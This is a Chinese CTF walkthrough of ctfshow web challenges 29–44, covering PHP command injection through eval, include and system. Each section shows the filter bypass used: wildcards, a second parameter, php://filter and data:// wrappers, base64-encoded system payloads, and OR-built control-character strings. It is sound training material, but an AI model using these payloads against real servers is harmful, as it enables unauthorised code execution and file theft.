---
title: ctfshow-web-命令执行
description: web-wp
recommend: 5
permalink: /2026/ctfshow-web-command-exec
date: 2026-11-01 10:15:00
updated: 2026-11-03 16:27:00
image: https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/baopo-2.jpg
categories: [web]
tags: [web,命令执行]
---

---

## web29

### 读懂代码

```php
error_reporting(0);/*关闭报错，即使错了也不会显示的，防止我们靠报错信息探测*/
if(isset($_GET['c'])){/*检查url里头，有没有报错的参数C*/
    $c = $_GET['c'];/*把参数C赋值给变量$C*/
    if(!preg_match("/flag/i", $c)){/*用正则看有没有flag这四个字母*/
        eval($c);/*没有的话就把$C当作代码执行*/
    }
    
}else{
    highlight_file(__FILE__);/*没传参数c时就把,题目源码高亮显示出来给我们看*/
}
```

### 函数

| 函数       | 作用                                                         |
| ---------- | ------------------------------------------------------------ |
| preg_match | php的正则匹配函数，“/flag/i”表示寻找字符串“flag”,"i"表示不区分大小写，也就是说，flag,Flag,FLAG都算 |
| eval()     | 把字符串当代码执行的函数，危险函数之一，它执行的是php代码，而不是终端命令 |
### 思路（开始之前先弄清楚这些）

#### Q1:我们的目标是什么？

拿flag，flag肯定藏在某个文件里（ctf-web一贯这样），那会是哪个文件呢？大概叫flag.php,我为什么会猜这个？首先，flag.php在我信息搜集的文章中遇到过，算是常见的可能会藏有flag的文件名之一，其次，你看代码` if(!preg_match("/flag/i", $c))`用正则检验有没有flag这个字符串，必须要没有flag这个字符串才能走下一步，你猜它为什么不禁别的字符串，唯独禁flag？偏爱吗❤?那很爱了。

当然是因为，文件名包含这个字符串啊，只是我们没办法明着访问flag.php

#### Q2:有什么可以利用的？

eval()会执行我传入的任何不含flag的php代码，这正是可以利用的一点

#### Q3:障碍是什么？怎么绕？

障碍：我的http请求里不能出现flag这四个连续的字母，包括大写，但是难点就在于目标文件偏偏又叫flag.php,所以我们需要绕过，有两种绕过思路

- 1.命令里不写”flag“,但照样能读到它→通配符，字符串拼接，编码
- 2.”写flag“但不写在被检查的参数C里：题目只检查$_GET['C'],我们传另一个参数装payload,C里头只写一句中转代码

### 法一：通配符绕过（经典）

### 什么是通配符？

`*` 是 **Linux Shell 的通配符**（glob），它由 Shell 在执行前展开：`f*` 自动匹配当前目录下所有 `f` 开头的文件名，`flag.php` 正好命中。

```
?c=system('ls');
?c=system('cat f*')
```

**过滤发生在 PHP 层，通配展开发生在 Shell 层，过滤者根本看不到展开后的真名。**

直接在url里边访问

```
https://f85fae9f-....challenge.ctf.show/?c=system('ls');
```

![image-20261101112601374](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101112601374.png)

先确认flag.php确实存在，再进行下一步

**这里特别要注意单引号要是直的，英文格式下的，不然界面可能会是空白，还有一点，最后的分号不能少**

如果写`?c=system('cat f*')`,界面可能是空白，需要ctrl+u查看源码才能看到flag

![image-20261101114359463](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101114359463.png)

如果写`?c=system('tac f*')`,可以直接看到flag

![image-20261101114549378](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101114549378.png)

#### Q:为什么cat tac 正着写和倒着写，显示的界面不一样？

 cat tac 两份输出的开头内容不一样，导致html解析器之后处理方式也不一样

浏览器渲染时，会扫描响应内容，遇到<就会进入“标签解析模式”：遇到`<?`开头，浏览器会把它当作一条注释开头，一直吞到下一个>为止，所以说，从`<?`到`>`的内容都不会在界面上显示，所以需要`ctrl+u`查看，刚巧,php的开始结尾就是`<?php ...?>`，看上边红字黑底的图片可知，这个文件没有？>,所以就一直从<?php吞到文件末尾,flag就显示不出来了

```php
<?php  /*从这里开始吞*/

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:14:07
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:14:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag = 'ctfshow{33a9d6bd-fee1-40ee-9cc1-88067edd1015}'; /*由于没有结束标志`>`就一直吞到文件末尾，包括flag,所以flag无法显示*/
```



tac倒着输出就刚好是红字黑底那张图片中的代码倒过来

#### tac很巧妙

```php
$flag = 'ctfshow{33a9d6bd-fee1-40ee-9cc1-88067edd1015}';
*/
# @link: https://ctfer.com
# @email: h1xa@ctfer.com
...
# -*- coding: utf-8 -*-
/*
<?php /*从这里开始吞，完全不影响flag输出*/
```

### 法二：双参数中转

#### 为什么可以绕过？

 ` if(!preg_match("/flag/i", $c))`正则只检查$c这一个参数的值，其它参数没有被检查，那就可以传两个参数，第一个参数绕过检查（参数的值是第二个参数的名字，不含flag），检查只会检查到一个参数名，第二个参数放真正的flag文件名，并且用函数获取文件内容。

```
?c=system($_GET[1]);&1=tac flag.php
```

`?c=system($_GET[1]);`里边没有flag这个字符串，通过，执行eval

`&1=tac flag.php`里边写着flag但是，没人检查啊

![image-20261101122326876](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101122326876.png)

```
?c=eval($_GET[1]);&1=system('tac flag.php');
```

这么写也可以

### 法三：include + php://filter 伪协议（经典）

这题的内容在php伪协议和base64过滤中详细解释了，信息搜集篇也有对include的解释，这里已经是第三次遇到了，具体内容就不做解释了

之前我们都是include作为题目内容，我们使用php伪协议，这里我们将include和php结合起来

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

得到的是base64编码的flag，找一些解码工具解码就行

![image-20261101123443608](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101123443608.png)

### 法四：把flag藏进编码里

既然题目不给出现flag这个字符串，那我把它编码了，不明着出现不就好了，但是它还是flag这个意思

我把tac flag.php编码之后填入system中

![image-20261101124518736](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124518736.png)

![image-20261101124900727](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124900727.png)

---

## web30

代码里和上一题相同的部分我就不注释了

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){/*一样的正则匹配，这里要绕过的是flag,system,php等三个字符串*/
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

### 读懂代码

```php
 if(!preg_match("/flag|system|php/i", $c))
```

这一句，依旧用到了preg_match()函数，正则匹配函数，"/.../"是正则的分隔符，“|”表示或，"i"表示不区分大小写，说明，我们在url中输入指令时，不能输入含flag,Flag，system,System,php,PHP等字符串，也就是说，我们没办法像上一题一样用``system()`,也不能写，`flag.php`,我们需要绕过这三个字符串

#### 先扫描一下根目录，看看有什么

```
...?c=print_r(scandir('/'));
```

- print_r():print readable,把变量内容以人能读懂的形式打印出来
- scandir():scan directory扫描一个目录里所有的文件，返回**数组**

#### 为什么要扫描根目录？

因为根目录是我们唯一知道的，确定的目录，也存在装有flag的文件放在根目录下的情况，这里啥也没扫出来

![image-20261102143408646](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102143408646.png)

### 扫描当前目录

```
?c=print_r(scandir(getcwd()));
```

这一句代码按顺序从上到下执行是这样的：

| 函数                    | 作用                               | 输入（）里边填什么 | 输出（返回什么） |
| ----------------------- | ---------------------------------- | ------------------ | ---------------- |
| getcwd                  | 取当前工作目录                     | -                  | 返回一个字符串   |
| scandir：scan directory | 扫描一个目录里所有的文件           | 目录               | 返回**数组**     |
| print_r：print readable | 把变量内容以人能读懂的形式打印出来 | -                  | -                |



![image-20261102143253532](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102143253532.png)

看到了flag.php,说明flag大概率就在这个文件夹里，但是题目过滤掉了flag,system,php，所以我们要绕过它们

### 怎么绕过呢？

关注一下，`?c=print_r(scandir(getcwd()));`返回的内容有哪些文件，flag.php index.php 我们是不是可以利用上一道题学到的通配符这种办法绕过呢

```
...?c=highlight_file(glob("f*")[0]);//在glob返回的数组中取flag.php，用highlight_file输出flag.php源码
```

| 函数           | 作用               | 输入                                                         | 输出         |
| -------------- | :----------------- | ------------------------------------------------------------ | ------------ |
| highlight_file | 读取并显示文件内容 | 输入需要字符串，刚好glob("f*")[0]返回的就是”flag.php“这串字符串 | 输出文件源码 |
#### 为什么要有[0]呢？

因为，glob按通配符查找文件/目录的函数，**返回数组**。因为"f*"通配符匹配的是f开头的所有文件，而当前目录下，f开头的有且仅有flag.php这是在扫描当前目录之后我们得知的，[0]表示取的是第一个文件，那不就是唯一的flag.php嘛

![image-20261102151933466](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102151933466.png)

---

## web31

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

### 禁了哪些东西

`flag | system | php | cat | sort | shell | . | 空格 | 单引`

依旧可以沿用上题的解题办法

```
...?c=print_r(scandir('/'));
```

```
?c=print_r(scandir(getcwd()));
```

```
...?c=highlight_file(glob("f*")[0]);//在glob返回的数组中取flag.php，用highlight_file输出flag.php源码
```

### 如果第二步扫描目录，不只一个f开头的文件怎么办？

- 法一：先看具体有哪些文件

  ``` 
  ?c=print_r(glob("f*"));
  ```

  假设是：

  ```
  Array
  (
      [0] => fa.php
      [1] => flag.php//flag在[1]
      [2] => foo.php
  )
  ```

  那就把`...?c=highlight_file(glob("f*")[0]);`中的[0]改成[1]

- 法二：缩小匹配模式

  把glob（“f*）换成

  ```
  glob("fla*")
  glob("f?ag*")
  glob("f[l]ag*")
  ```

---

## web32

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这题禁的东西可就多了，我们来看，首先要明确`/.../`是分隔符，`/.../i`后边加一个i表示不区分大小写，由此可知，`/.../i`里边的东西就是黑名单

### 怎么看黑名单？

`flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(` 

|:表示或，\ :是转义符，正则匹配里有些字符本身就有特殊含义，所以在匹配它们时需要加转义符，而我们在阅读时可以把转义符去掉，这样来看会更加清晰一点

| 被禁     | 影响                                     |
| :------- | :--------------------------------------- |
| `flag`   | 不能写 `flag.php`、`/flag`、`$flag`      |
| `system` | 不能用 `system()`                        |
| `php`    | 不能写 `phpinfo()`、`php://`、`flag.php` |
| `cat`    | 不能用 `cat` 命令                        |
| `sort`   | 不能用 `sort` 命令                       |
| `shell`  | 不能用 `shell_exec()`                    |
| `.`      | 不能写扩展名、路径中的点                 |
| 空格     | 不能用普通空格分隔代码或命令             |
| `'`      | 不能用单引号字符串                       |
| 反引号 ` | 不能用反引号执行命令                     |
| `echo`   | 不能用 `echo` 输出                       |
| `;`      | 不能用分号结束语句                       |
| `(`      | 不能写左括号，**也就是不能正常调用函数** |

###  这题的黑名单那么多，连函数都禁了怎么办？

#### include可以解决（被禁的问题

**include不是函数，它是php语言结构的关键字，它的语法是`include 表达式;`**

但是我们平时写题时见多了`include()`带括号的形式，容易先入为主，以为它是函数，其实不是

##### include的作用：

**读取并执行 或 包含，但包含不包括输出**

#### 双参数

记得之前也提过这个思路，代码中被检查的只有变量C,这时候就可以用双变量，绕过对C的黑名单检查

用双参数绕过的办法查看当前目录下有什么文件

```
?c=include$_GET[1]?>&1=data://text/plain,<?php print_r(scandir(getcwd()));?>
```

#### 为什么要这么写呢？

##### 双参数为什么不可以这样写？  ?c=include$_GET[1]?>&1=print_r(scandir(getcwd()));

原因就在include,我们来看，把1带进前边的$_GET[1]_之后是怎么样的: 

?c=include "print_r(scandir(getcwd()))" 

include看到后面`"print_r(scandir(getcwd()))" `这一串会把它当成文件名，意思是，试图打开名叫print_r(scandir(getcwd()))的文件，没有这个文件名，则失败

##### 所以`?c=include$_GET[1]?>&1=data://text/plain,<?php print_r(scandir(getcwd()));?>`是怎么作用的呢？

先把1带进前边的$_GET[1]_：

`?c=include "data://text/plain,<?php print_r(scandir(getcwd()));?>"`

**data://:数据url包装器，把后边的字符串变成内存流，这个“流”感觉有点抽象，其实就是data://给了后边的字符串一个接口，让include可以像读文件一样读取它**

过程：

data://把逗号后边的字符串`<?php print_r(scandir(getcwd()));?>`变成内存流

include:读取这个流，内容就是`<?php print_r(scandir(getcwd()));?>`

因为内容有<?php,include执行它

scandir(getcwd()):获取当前目录，返回数组

print_r:把数组打印出来

##### include "data://text/plain,`<?php print_r(scandir(getcwd()));?>`"和include "php://filter/.../resource=flag.php"的区别

data://上边已经说过了，那php://filter/.../resource=flag.php是怎么工作的?二者一样吗？

`include "php://filter/.../resource=flag.php"`

include 打开并读取flag.php

读取时会套一个Base64编码过滤器，把flag.php里的文本编码成base64文本，而不是原始 PHP 源码

base64的字符集里边没有<>,所以base64编码之后不可能出现<?php开头，include看不到<?php就不会执行，会把它当作普通文本输出，所以最后看到的是 Base64，不是原始源码；需要再解码一次

![image-20261102203954763](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102203954763.png)

然后发现有flag.php,大概率就是在这里，那问题就回到怎么取flag,php文件里的内容了

#### 为什么include$_GET没有空格也可以？_

按理来说include的表达式是`include 表达式;`因为，php虽然大多数是用空格来分词的，但其实它是靠词法（token）来分词的,这里`$` 不能接在标识符后面，是一个明确的分界，所以不用空格。

疑？？？？这个味道有没有感觉很熟悉？
include+想要输出文件里的内容 应该怎么写来着

**include+php伪协议+base64过滤**

为什么这么搭配来着，简而言之就是，include它不能碰上php语言的<?php开头,不然就不会把文本内容打印出来，我们就看不到，所以这里需要伪协议破坏掉，就利用base64编码，破环掉开头，让include打出文件内容

具体写法

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20261102205605635](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102205605635.png)

得到之后解码即可



---

## web33-35

**都可以用上题的办法，重点是要理解它是怎么执行的**

## web36

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

查看黑名单：

`flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]`

发现这题连数字都禁了，那上题的$_GET[1]是不行了，数字不行，那还有**字母**,把数字1改成字母试试看

```
?c=include$_GET[a]?>&a=data://text/plain,<?php print_r(scandir(getcwd()));?>
```

![image-20261103161719361](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261103161719361.png)

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20261103161901325](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261103161901325.png)

---

## web37

```php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){/*正则绕过，绕过的是flag这个字符串*/
        include($c);/*include包含$C的文件名，它回去找相应文件名的文件*/
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

`PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==`其实是`<?php system("cat flag.php");?>`base64编码过后的结果

黑名单只有 `/flag/i`，但正则看到的是 base64 编码串 `PD9waHAg...`，不含 "flag"，放行。 `include()` 认出 `data://` 伪协议后，先把载荷解码成 `<?php system("cat flag.php");?>`，再当 PHP 执行。 检查发生在解码前，敏感词诞生在解码后——利用这个时间差完成绕过。

![image-20261107020010661](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261107020010661.png)

---

## web38

```php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```







![image-20261107023238381](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261107023238381.png)

---

## web39

```php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");/*这题的特殊点主要在这里，它会在后面加上“.php”,会产生一些影响*/ 
        }
        
}else{
    highlight_file(__FILE__);
}
```

### 这个“.php”在不同的地方后面，分别会有什么影响？

`include($c.".php");`利用并置“.”在$c后面强行加上“.php”

| ?c=                | 并置之后变成          | 影响                                                         |
| ------------------ | --------------------- | ------------------------------------------------------------ |
| flag               | flag.php              | 有flag,正则过不了                                            |
| php://filter       | resource=flag.php.php | 有flag,正则过不了                                            |
| php://input        | php://input.php       | 在这里想用php协议input，php：//后边必须是input，多了.php协议就不对了 |
| data://text/palin, | X,php                 | data://之后的文件内容，是从第一个逗号开始一直到最后的，`.php`混进了内容里，我们可以让它跟在注释//后面,把它注释掉，这样不就没有影响了吗？ |

### 有了思路之后，可以先验证flag.php文件是否真的存在？

#### 先看看data://伪协议有没有被禁

```
?c=data://text/plain,<?php echo 12345;//
```

如果界面输出12345说明data://伪协议可行，可以放心进行下一步，与此同时，注意一下，因为题目会并置一个`.php`在后边，所以我们以//注释结尾，消除影响，而不是`?>`结尾。

#### 验证flag,php文件是否真的存在？在哪里？

因为有时候，flag.php会叫f1ag.phph或者是其他的，所以这里要验证一下

```
?c=data://print_r(scandir(grtcwd()));//
```

也可以写成

```
?c=data://text/plain,<?php print_r(scandir("./"));//
```

![image-20261108110526043](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261108110526043.png)

确实存在

### 利用函数输出在flag.php里边的flag

可用函数

| 函数                    | 输入                 | 作用                 |
| ----------------------- | -------------------- | -------------------- |
| `highlight_file($path)` | 字符串：**文件路径** | 读文件、语法高亮打印 |
| `show_source($path)`    | 文件路径             | 上者的别名，完全等价 |

```
?c=data://text/plain,<?php highlight_file(current(glob("f*.php")));//
```

或者

```
?c=data://text/plain,<?php show_source(current(glob("f*.php")));//
```

#### current 的作用

输入：数组

返回：字符串

完成了数组到字符串的转换，符合highlight的输入

![image-20261108140303060](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261108140303060.png)

---

## web40

```php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);/*eval漏洞*/
    }
        
}else{
    highlight_file(__FILE__);
}
```

### 关于被禁的()

可能刚开始看到（）会觉得完蛋了，连括号都不能用，那怎么用函数啊

其实不是，题目之中禁掉的是中文格式下的括号，而我们平常调用的函数是英文格式下的括号，该怎么测试被禁掉的括号是什么格式下的呢？其实直接输入函数测试，看有无反应就可以了

```
?c=print_r(scandir(getcwd()));
```





![image-20261108235936932](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261108235936932.png)

由于题目禁掉了，`""`所以我们无法用glob("f*")通配符

### 利用反转和next

```
?c=show_source(next(array_reverse(scandir(getcwd()))));
```

- getcwd获得当前路径
- scandir获得当前路径下的当前文件
- array_reverse反转
- next数组的指针移动一步
- show_source输出文件内容

```
getcwd()         →  "C:\...\chaindemo"                        字符串
    ↓
scandir(路径)     →  [".", "..", "flag.php", "index.php"]      数组(字母序)
    ↓
array_reverse()  →  ["index.php", "flag.php", "..", "."]      数组(反转)
    ↓
next()           →  "flag.php"                                字符串
    ↓
show_source()    →  页面打印 flag.php 高亮源码                  bool(true) + 副作用
```



#### array_reverse和next究竟是怎么工作的

array_reverse:就反转，类似于，本来是1234,反转之后变成4321

next:指针,光标往后移动一步

```
反转前 (scandir 原序)                反转后 (array_reverse 的新数组)
[0] "."          ●← 光标初始在这      [0] "index.php"   ●← 新数组光标自动在这
[1] ".."                            [1] "flag.php"    ← next 走一步到这
[2] "flag.php"  ← 目标在这           [2] ".."
[3] "index.php"                     [3] "."

     目标离光标两步 ✗                     目标离光标一步 ✓
```

![image-20261109005300450](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261109005300450.png)

## web41

```php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){/*黑名单*/
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

黑名单里有字母和数字还有各种符号，实际上，被禁的东西还是挺多的，那就看有哪些没被禁

`空格 ! " # % ' ( ) * , . / : ; < = > ? @ \ _ ` |`还有最重要的ASCII控制码

### 关于ASCII控制码

有点数字逻辑的味道

#### 字符在计算机里就是数字

在计算机里，一个字节8个二进制位

| 字符 | 十进制 | 十六进制 | 二进制    |
| ---- | ------ | -------- | --------- |
| 空格 | 32     | 0x20     | 0010 0000 |
| !    | 33     | 0x21     | 0010 0001 |
| '    | 39     | 0x27     | 0010 0111 |
| (    | 40     | 0x28     | 0010 1000 |
| @    | 64     | 0x40     | 0100 0000 |
| `    | 96     | 0x60     | 0110 0000 |
| a    | 97     | 0x61     | 0110 0001 |
| s    | 115    | 0x73     | 0111 0011 |
| y    | 121    | 0x79     | 0111 1001 |

#### 什么是ASCII控制字符

ASCII的0-31（Ox00~Ox1F）Ox表示16进制，这一段的字符不是用来显示文字的，而是早期电传打字机用来控制设备的信号，所以叫控制字符，它们的特点就是：

- 键盘上打不出来
- 终端里看不到
- 任然是合法字节，可以放进文件，HTTP请求体，字符串里

它们看不见，不代表不存在，比如一个文件里有Ox08,cat不会显示成<B5>,但是字节确实在那里

这题黑名单过滤的缺陷就是，只堵住了它们想得到的字符，但是没堵住那些没列出来的字符

#### 按位或`|`(or)有什么用

`|`是按位或：两个二进制里只要有一个是1，那结果就是1

单个

```
0|0=0
0|1=1
1|0=1
1|1=1
```

对两个字节or，就是八个二进制数，分别做一次or

```
  0x20  0010 0000   (空格)
| 0x40  0100 0000   ('@')
-------------------
  0x60  0110 0000   = '`'
```

php里头写出来就是

```
'!' | '@'      // 结果是字符串 "a"
' ' | '@'      // 结果是字符串 "`"
```

##### 关键：最关键的7个二进制，有他们就能拼出所有的ASCII

```
位：   64   32   16    8    4    2    1
    0x40 0x20 0x10 0x08 0x04 0x02 0x01
```

只要手里有这 7 个单位字节，把它们按需 OR 起来，就能得到 0~127 的**任意**字符

举例：

```
'y' = 121 = 64+32+16+8+1  = '@'|' '|DLE|BS |SOH
's' = 115 = 64+32+16+2+1  = '@'|' '|DLE|STX|SOH
't' = 116 = 64+32+16+4    = '@'|' '|DLE|EOT
'e' = 101 = 64+32+4+1     = '@'|' '|EOT|SOH
'm' = 109 = 64+32+8+4+1   = '@'|' '|BS |EOT|SOH
```

所以这题如果想让你的函数能够执行的话，就需要把它们都换成用控制字符来表示的形式

### 文件探测

先看看flag.php是否真的存在

注意，这里是POST请求，所以我在这用Hackbar

通过脚本可以得到相应的有控制字符构成的php函数

```
c=%28%28%27%40%27%7C%27%20%27%7C%27%10%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%02%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%04%27%7C%27%02%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%04%27%29.%28%27%40%27%7C%27%10%27%7C%27%08%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%02%27%29%29%28%28%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%04%27%7C%27%02%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%02%27%29%29%28%28%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%04%27%29.%28%27%40%27%7C%27%20%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%29%29%28%29%29%29

```



![image-20261109213233502](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261109213233502.png)

得知flag.php存在，就用`highlight_file(current(glob('f*')))`对应的控制字符来

```
c=%28%28%27%40%27%7C%27%20%27%7C%27%08%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%04%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%04%27%29.%28%27%40%27%7C%27%10%27%7C%27%08%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%02%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%04%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%01%27%29%29%28%28%28%27%40%27%7C%27%20%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%04%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%02%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%02%27%29.%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%04%27%7C%27%02%27%29.%28%27%40%27%7C%27%20%27%7C%27%10%27%7C%27%04%27%29%29%28%28%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%04%27%29.%28%27%40%27%7C%27%20%27%7C%27%08%27%7C%27%04%27%7C%27%02%27%7C%27%01%27%29.%28%27%40%27%7C%27%20%27%7C%27%02%27%29%29%28%28%28%27%40%27%7C%27%20%27%7C%27%04%27%7C%27%02%27%29.%28%27%20%27%7C%27%08%27%7C%27%02%27%29%29%29%29%29
```





![image-20261109210950972](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261109210950972.png)

---

## web42

```php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

### 巧用注释`||`

这一题，是GET加上system可执行命令的函数，这里用到了php语言中的并置`.`所以`>/dev/null 2>&1`会自动添加在$c的后方，导致你输入的指令多了这一部分，无法达到你想要的执行指令的效果，在这里我们可以学习一个在末尾添加注释的办法，把并置的部分当作注释给它注释掉，这样就不会影响我们的指令了

#### 先看看当前目录下都有哪些文件

我们已经知道可以利用注释去解决并置部分，这一题并没有禁掉什么东西，我们就可以ls查看一下文件

```
?c=ls||
```



![image-20261116195628584](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116195628584.png)

可以猜测flag大概率是在flag.php文件下了

```
?c=tac flag.php
```



![image-20261116195725393](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116195725393.png)

---

## web43

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这题在上一题的基础上，增加了黑名单，禁掉了； cat但是其实并不影响||,依旧可以用上一题的做法



![image-20261116202338889](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116202338889.png)

![image-20261116202236195](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116202236195.png)  

---

## web44

```php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

相较于上一题，这一题禁的东西就更多了，也体现了一个循序渐进的过程吧，其实就是多禁了个flag,那我们就可以使用通配符`**`绕过

```php
?c=tac fla*.php||
```

